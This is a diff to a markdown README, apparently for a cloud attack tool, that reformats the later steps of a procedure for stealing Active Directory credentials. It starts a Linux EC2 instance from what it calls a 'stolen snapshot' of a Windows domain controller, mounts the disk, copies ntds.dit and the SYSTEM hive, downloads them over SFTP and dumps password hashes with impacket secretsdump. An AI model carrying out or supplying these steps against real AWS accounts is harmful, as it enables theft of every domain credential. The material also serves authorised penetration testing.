@@ -20,18 +20,36 @@
 
 ### 6) Run "run-instance" command to create new linux ec2 with our stolen snapshot
 
-### 7) Ssh run "sudo mkdir /windows"
+### 7) SSH Run
 
-### 8) Ssh run "sudo mount /dev/xvdf1 /windows/"
+    sudo mkdir /windows
 
-### 9) Ssh run "sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"
+### 8) SSH run 
 
-### 10) Ssh run "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"
+    sudo mount /dev/xvdf1 /windows/
 
-### 11) Ssh run "sudo chown ec2-user:ec2-user /home/ec2-user/*"
+### 9) SSH run 
 
-### 12) SFTP get "/home/ec2-user/SYSTEM ./SYSTEM"
+    sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user
 
-### 13) SFTP get "/home/ec2-user/ntds.dit ./ntds.dit"
+### 10) SSH run 
 
-### 14) locally run "secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets' , expects secretsdump to be on path
+    sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user
+
+### 11) SSH run 
+
+    sudo chown ec2-user:ec2-user /home/ec2-user/*
+
+### 12) SFTP 
+
+    get "/home/ec2-user/SYSTEM ./SYSTEM"
+
+### 13) SFTP 
+
+    get "/home/ec2-user/ntds.dit ./ntds.dit"
+
+### 14) locally run 
+
+    impacket-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets
+    
+### Expects secretsdump to be on path
